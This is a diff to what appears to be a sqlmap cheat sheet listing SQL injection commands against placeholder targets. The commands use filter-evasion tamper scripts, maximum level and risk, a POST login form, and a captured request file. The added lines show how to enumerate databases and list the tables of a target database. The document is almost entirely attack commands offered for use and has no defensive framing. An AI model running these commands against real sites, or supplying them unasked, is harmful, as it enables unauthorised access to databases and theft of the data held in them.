@@ -23,3 +23,7 @@ $ sqlmap -u "Target.com" --random-agent -v 3 --tamper="between,randomcase,space2
 $ sqlmap -u "Target.com" --random-agent -v 3 --dbs
 $ sqlmap -u "Target.com" --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
 $ sqlmap -u "http://sitetarget.com/login" --data="userid=admin&passwd=admin" --method POST --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
+$ sqlmap -r poc.txt --threads=10 --random-agent --level=5 --risk=3 --tamper=space2comment,between --dbs
+
+example dump DB use poc http post request :
+$ sqlmap -r poc.txt --threads=10 --random-agent --level=5 --risk=3 --tamper=space2comment,between --dbms=MySQL -D database_target --tables
